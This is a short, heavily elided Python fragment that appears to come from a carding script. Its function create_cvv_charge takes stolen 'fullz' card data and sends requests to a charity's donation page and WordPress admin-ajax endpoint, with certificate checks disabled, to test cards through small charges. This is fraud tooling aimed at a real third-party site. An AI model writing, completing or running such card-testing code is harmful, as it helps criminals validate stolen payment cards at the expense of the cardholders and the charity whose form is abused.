...
async def create_cvv_charge(fullz , session):
    ...
    'user-agent': agent,
        ...
        req1 = session.get("https://needhelped.com/campaigns/poor-children-donation-4/donate/", headers=headers,  verify=False, timeout=30)
    ...
    'x-requested-with': 'XMLHttpRequest',
        ...
        req3 = session.post("https://needhelped.com/wp-admin/admin-ajax.php", headers=headers, data=data,  verify=False, timeout=30)
        print(req3.text)
